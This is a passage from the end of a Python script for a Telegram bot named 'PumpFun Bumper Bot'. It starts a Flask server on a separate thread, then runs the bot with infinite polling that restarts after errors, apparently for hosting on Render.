    print(f"🌐 Starting Flask server on port {PORT}")
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

def run_bot():
    """Run Telegram bot with polling"""
    print("🤖 Starting Telegram bot...")
    load_data()

    # Start keep-alive thread
    start_keep_alive()
    print("✅ Keep-alive thread started!")

    # Disable webhook and use polling
    bot.remove_webhook()
    time.sleep(2)

    while True:
        try:
            print("🔄 Starting bot polling...")
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"❌ Bot error: {e}")
            print("🔄 Restarting bot in 10 seconds...")
            time.sleep(10)

if __name__ == "__main__":
    print("🚀 Starting PumpFun Bumper Bot on Render...")

    # Start Flask in a separate thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Give Flask time to start
    time.sleep(3)

    # Start the bot
    run_bot()
